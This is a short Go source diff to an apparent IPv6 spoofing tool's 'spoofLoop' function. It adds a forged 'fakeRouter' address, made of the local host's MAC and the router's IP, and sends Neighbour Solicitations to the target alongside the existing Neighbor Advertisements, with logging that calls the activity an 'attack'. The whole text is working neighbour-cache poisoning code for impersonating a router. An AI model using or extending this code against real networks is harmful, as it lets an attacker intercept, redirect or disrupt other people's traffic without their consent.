@@ -85,6 +85,10 @@ func (h *Handler) spoofLoop(dstAddr packet.Addr) {
 				if err := h.SendNeighborAdvertisement(host, dstAddr, targetAddr); err != nil {
 					fmt.Println("icmp6 : error sending na ", err)
 				}
+				fakeRouter := packet.Addr{MAC: host.MAC, IP: routerAddr.IP}
+				if err := h.SendNeighbourSolicitation(fakeRouter, dstAddr, dstAddr.IP); err != nil {
+					fmt.Println("icmp6 : error sending na ", err)
+				}
 
 				if nTimes%16 == 0 {
 					fmt.Printf("icmp6 : attack src %s dst %s target %s repeat=%v duration=%v\n", host, dstAddr, targetAddr, nTimes, time.Since(startTime))
